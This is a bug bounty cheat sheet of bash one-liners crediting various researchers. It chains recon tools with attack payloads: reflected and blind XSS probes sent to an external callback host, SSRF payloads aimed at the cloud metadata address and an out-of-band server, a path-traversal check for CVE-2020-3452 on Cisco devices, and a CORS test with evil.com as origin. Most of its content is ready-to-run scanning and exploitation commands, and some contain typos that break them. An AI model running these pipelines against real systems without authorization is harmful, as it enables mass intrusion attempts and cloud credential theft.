# For loops and one liners for bug bounty 
Credits goes to all those awesome researchers who uploaded these on Twitter and their GitHub  

Please Note: Kindly use this only for reference and learning purposes using this doesn't means that you will find Vulnerabilities cause everybody is using this so try to be creative while using it and modify them to get unique results :)

## One Liners for XSS

### Using DALFOX to send the result for xss

```bash
cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://yours.xss.ht -o result.txt
```

### XSS without GF Patterns

```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

```

### Using Gospider with Dalfox to find XSS

```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o output.txt
```

### Scan subdomains from Bounty Targets data Using DalFox for XSS

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; | subfinder -dL domains.txt | httpx -silent -threads 500 | tee -a subdomains.txt | dalfox file subdomains.txt -b your.xss.ht pipe

```
### Using Kxss for finding xss issues

```bash
cat http://subdomains.txt | waybackurls | kxss
```

### Using Gospider with qsReplace

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg/onload=confirm(1);>'
```

************************************************************************************************************************************


## For Finding Subdomains AssetDiscovery  

### For making a huge wordlist of subdomains with Rapid 7 FDNS @m4ll0k

Download the zip file from here
```bash
gzip -dc latestfile-fdns_a.json.gz | jq .name | sed 's/"//g' | xargs -I @bash -c 'tldextract @' | awk '{print $1}' >> mysubs.txt 
```

### One liner to fetch all URLs in scope of all public programs @_ayoubfathi_

```bash
curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json | jq -r '.[].targets.in_scope[] | select(.asset_type|contains("URL")) | .asset_identifier' |grep -v "*" | sort
```
### Finding Subdomains from crt.sh @vict0ni

```bash
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### From Bounty Targets Data @dwisiswant0

For Hackerone
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'

```
For Bugcrowd
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

```
For Intigriti
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'

```

### For Finding ASN's of a ORG using amass @KingOFBugBounty
```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''

```

### While Loop For Subfinder To Discovery new Subdoamins it will run Every 2 hours

```bash
while true; do subfinder -dL domains.txt -all | anew subdomains1.txt | httpx | notify ; sleep 7200; done
```
Note: Before running the above command make sure you do the below first:
Run `subfinder -dL domains.txt -all >> subdomains1.txt`

Install nuclei, subfinder, Notify and anew



### Brute Force List of subdomains using FFuf

```bash
for url in ` cat $filename `; do ffuf -c -w path.txt -u $url/FUZZ -o result.json ; done >> result.txt
```

### For finding Hidden Servers and Admin Panles @rez0

```bash
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 

```

## One liners for SSRF

### Using waybackurls and gau @R0X4R
After finding subdomains with HTTPX run the Following

```bash
cat subdomains.txt | gauplus --random-agent -b png,jpg,svg,gif -t 100 | anew -q gau_output.txt
cat subdomains.txt | xargs -P 30 -I host bash -c "echo host | waybackurls | anew -q wayback_output.txt"
cat wayback_output.txt gau_output.txt | urldedupe -s | anew -q parameters.txt

Mannual
cat parameters.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I host -P 50 bash -c "curl -ks 'host' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - X \n \"" | grep "VULN"


Using OOB
cat parameters.txt | gf ssrf | anew -q ssrf.txt

cat ssrf.txt | qsreplace "interactsh server ID" | anew -q ssrf_test.txt
ffuf -w ssrf_test.txt -u FUZZ -p "0.6-1.2" -H "(header in thread)" -t 200 -s

```
### Using nuclei and Gf for microstrategy SSRF @Virdoex_hunter
```bash
subfdiner -dL domains.txt | httpx | gau | gf ssrf | nuclei -t ~/nuclei-templates/vulnerabilities/other/microstrategy-ssrf.yaml -o result.txt

```
## One Liners for Recon and Visual inspection

### Using Assetfinder with gowitness

```bash
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```

### Find Subdomains using Subfinder and opens them on Firefox @payloadartists

```bash
subfinder -d $1 -silent -t 100 | httprobe -c 50 | sort -u | while read line; do firefox $line; sleep 10; done

```


## One Liners for information disclosure

### Using WaybackURL to find Excel File leads to PII Disclosure @M0_SADAT

```bash
gau http://hacked-site.com | waybackurls | grep ".xlsx"
```






## One Liners for CVE and Vulnerabilties

### To find CVE 2020-3452 

```bash
while read domains.txt; do curl -s -k "https://$domains/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```

### CORS Missconfiguration @

```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

```



